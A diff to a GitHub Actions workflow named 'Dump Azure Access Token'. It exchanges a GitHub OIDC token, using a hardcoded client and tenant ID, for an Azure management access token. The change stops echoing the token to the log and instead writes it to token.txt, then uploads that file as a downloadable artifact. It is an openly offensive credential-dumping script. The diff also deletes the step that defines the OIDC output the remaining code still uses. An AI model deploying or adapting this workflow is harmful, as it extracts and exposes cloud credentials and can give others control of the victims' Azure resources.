@@ -1,32 +1,15 @@
-name: Dump Azure Access Token
-
-on:
-  workflow_dispatch:
-
-permissions:
-  id-token: write
-  contents: read
-
-jobs:
-  dump-token:
-    runs-on: ubuntu-latest
-    steps:
-      - name: Get OIDC token from GitHub
-        id: oidc
-        uses: actions/github-script@v6
-        with:
-          script: |
-            const token = await core.getIDToken("api://AzureADTokenExchange");
-            core.setSecret(token);
-            core.setOutput("id_token", token);
-
-      - name: Exchange for Azure access token (via federated identity)
-        id: azure_token
+      - name: Exchange and dump token
         run: |
           ACCESS_TOKEN=$(curl -s -X POST \
             -H "Content-Type: application/x-www-form-urlencoded" \
             -d "client_id=c265ea2a-1235-446d-bd74-5d8228c904b1&grant_type=client_credentials&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&client_assertion=${{ steps.oidc.outputs.id_token }}&scope=https://management.azure.com/.default" \
             "https://login.microsoftonline.com/fdd066e1-ee37-49bc-b08f-d0e152119b04/oauth2/v2.0/token" | jq -r .access_token)
-            
-          echo "🔥 YOUR ACCESS TOKEN 🔥"
-          echo "$ACCESS_TOKEN"
+
+          echo "$ACCESS_TOKEN" > token.txt
+          echo "[+] Token written to token.txt"
+      
+      - name: Upload token.txt as artifact
+        uses: actions/upload-artifact@v3
+        with:
+          name: azure-access-token
+          path: token.txt
